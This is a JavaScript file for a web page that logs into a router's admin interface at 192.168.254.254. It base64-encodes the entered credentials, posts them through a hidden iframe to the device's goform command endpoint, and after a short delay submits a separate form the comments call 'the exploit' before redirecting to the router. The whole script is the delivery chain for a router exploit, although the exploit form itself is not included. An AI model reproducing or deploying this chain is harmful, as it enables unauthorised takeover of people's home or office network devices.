document.getElementById('showPassword').addEventListener('change', function() {
    let passwordField = document.getElementById('password');
    if (this.checked) {
        passwordField.type = 'text';
    } else {
        passwordField.type = 'password';
    }
});

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    let username = document.getElementById('username').value;
    let password = document.getElementById('password').value;

    // Base64 encoding
    username = btoa(username);
    password = btoa(password);

    // Construct the form data
    let formData = new FormData();
    formData.append('isTest', 'false');
    formData.append('goformId', 'LOGIN');
    formData.append('username', username);
    formData.append('password', password);

    // Create a new form and submit it using a hidden iframe
    let form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://192.168.254.254/goform/goform_set_cmd_process';
    form.target = 'hidden_iframe';

    formData.forEach((value, key) => {
        let input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        form.appendChild(input);
    });

    document.body.appendChild(form);
    form.submit();

    // Remove the temporary form
    document.body.removeChild(form);

    // Display response (for demonstration purposes, we display a success message)
    document.getElementById('responseBox').innerText = 'Form submitted. Please check the response in the network tab.';

    // Submit the exploit form after a slight delay to ensure login completes
    setTimeout(function() {
        document.getElementById('exploit').submit();

        // Open a new tab to the specified URL after submitting the exploit form
        setTimeout(function() {
            window.location.href = 'http://192.168.254.254';
        }, 1000); // 1-second delay to ensure the exploit form submission completes
    }, 2000); // 2-second delay to ensure the login completes
});
